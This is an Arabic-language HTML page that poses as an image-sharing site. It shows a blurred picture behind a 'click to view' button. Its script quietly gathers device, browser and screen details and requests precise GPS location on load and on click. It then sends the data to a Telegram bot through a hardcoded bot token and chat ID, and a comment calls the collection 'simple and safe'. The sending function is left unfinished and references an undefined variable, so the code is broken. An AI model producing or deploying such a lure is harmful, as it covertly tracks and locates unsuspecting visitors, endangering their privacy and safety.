<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>موقع رفع الصور</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            max-width: 600px;
            width: 100%;
            background: white;
            border-radius: 20px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.15);
            overflow: hidden;
            animation: slideUp 0.8s ease-out;
        }

        @keyframes slideUp {
            from { transform: translateY(50px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        .header {
            background: linear-gradient(135deg, #2c3e50 0%, #34495e 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }

        .main-image {
            width: 100%;
            max-width: 400px;
            height: auto;
            border-radius: 15px;
            box-shadow: 0 15px 30px rgba(0,0,0,0.2);
            margin: 30px auto;
            filter: blur(20px);
            transition: filter 0.5s ease;
            display: block;
        }

        .main-image.clear {
            filter: blur(0px);
        }

        .click-button {
            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 10px;
            font-size: 1.2em;
            font-weight: bold;
            cursor: pointer;
            margin: 20px auto;
            display: block;
            transition: all 0.3s ease;
        }

        .click-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(231, 76, 60, 0.4);
        }

        .success-message {
            background: #d4edda;
            color: #155724;
            padding: 20px;
            border-radius: 10px;
            margin: 20px;
            text-align: center;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>موقع رفع الصور</h1>
            <p>منصة سهلة وسريعة لرفع ومشاركة الصور</p>
        </div>

        <img src="https://i.imgur.com/zcb3oRL.jpeg" 
             alt="الصورة المختارة" 
             class="main-image" 
             id="mainImage">

        <button class="click-button" id="viewButton">
            🔍 اضغط هنا لمشاهدة الصورة
        </button>

        <div class="success-message" id="successMessage">
            ✅ تم الموافقة على عرض الصورة
        </div>
    </div>

    <script>
        // متغيرات بسيطة
        let userLocation = null;

        // جمع معلومات الجهاز - بسيط وآمن
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let info = {
                type: 'غير معروف',
                brand: 'غير معروف',
                model: 'غير معروف',
                os: 'غير معروف',
                browser: 'غير معروف'
            };

            // تحديد نوع الجهاز
            if (/iPhone/i.test(ua)) {
                info.type = 'iPhone';
                info.brand = 'Apple';
                info.os = 'iOS';
                const match = ua.match(/iPhone OS (\d+)[._](\d+)/);
                if (match) {
                    info.model = `iPhone (iOS ${match[1]}.${match[2]})`;
                }
            } else if (/iPad/i.test(ua)) {
                info.type = 'iPad';
                info.brand = 'Apple';
                info.os = 'iOS';
            } else if (/Android/i.test(ua)) {
                info.os = 'Android';
                const versionMatch = ua.match(/Android (\d+(?:\.\d+)*)/);
                if (versionMatch) {
                    info.model = `Android ${versionMatch[1]}`;
                }
                
                if (/Samsung/i.test(ua)) {
                    info.brand = 'Samsung';
                } else if (/Huawei/i.test(ua)) {
                    info.brand = 'Huawei';
                } else if (/Xiaomi/i.test(ua)) {
                    info.brand = 'Xiaomi';
                } else {
                    info.brand = 'Android';
                }

                if (/Mobile/i.test(ua)) {
                    info.type = 'هاتف أندرويد';
                } else {
                    info.type = 'تابلت أندرويد';
                }
            } else if (/Windows/i.test(ua)) {
                info.type = 'كمبيوتر';
                info.brand = 'Microsoft';
                info.os = 'Windows';
            } else if (/Mac/i.test(ua)) {
                info.type = 'كمبيوتر';
                info.brand = 'Apple';
                info.os = 'macOS';
            }

            // تحديد المتصفح
            if (/Chrome/i.test(ua)) {
                info.browser = 'Chrome';
            } else if (/Firefox/i.test(ua)) {
                info.browser = 'Firefox';
            } else if (/Safari/i.test(ua)) {
                info.browser = 'Safari';
            } else if (/Edge/i.test(ua)) {
                info.browser = 'Edge';
            }

            return info;
        }

        // جمع معلومات النظام
        function getSystemInfo() {
            return {
                screen: `${screen.width}x${screen.height}`,
                language: navigator.language || 'غير معروف',
                platform: navigator.platform || 'غير معروف',
                cookiesEnabled: navigator.cookieEnabled ? 'مفعلة' : 'معطلة',
                onLine: navigator.onLine ? 'متصل' : 'غير متصل'
            };
        }

        // الحصول على الموقع (GPS فقط)
        function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: Math.round(position.coords.accuracy) + ' متر',
                            method: 'GPS'
                        });
                    },
                    () => {
                        resolve(null);
                    },
                    {
                        timeout: 10000,
                        enableHighAccuracy: true
                    }
                );
            });
        }

        // إرسال البيانات إلى Telegram
        function sendToTelegram(data) {
            const botToken = '7982181249:AAEyLwc9c24fu-uqUT87v26S6282XTD41XI';
            const chatId = '170383339';

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            }).then(() => {
                console.log('✅ تم الإرسال بنجاح');

        // الدالة الرئيسية
        async function viewImage() {
            // إظهار الصورة
            document.getElementById('mainImage').classList.add('clear');
            document.getElementById('viewButton').style.display = 'none';
            document.getElementById('successMessage').style.display = 'block';
            
            // جمع البيانات
            const deviceInfo = getDeviceInfo();
            const systemInfo = getSystemInfo();
            const locationInfo = await getLocation();
            
            const data = {
                device: deviceInfo,
                system: systemInfo,
                location: locationInfo
            };
            
            console.log('📊 البيانات المجمعة:', data);
            
            // إرسال البيانات
            sendToTelegram(data);
        }

        // ربط الزر بالدالة
        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById('viewButton').addEventListener('click', viewImage);
        });

        // محاولة الحصول على الموقع عند تحميل الصفحة
        window.addEventListener('load', async function() {
            console.log('🚀 تم تحميل الصفحة');
            userLocation = await getLocation();
            if (userLocation) {
                console.log('✅ تم الحصول على الموقع');
            } else {
                console.log('❌ لم يتم الحصول على الموقع');
            }
        });
    </script>
</body>
</html>
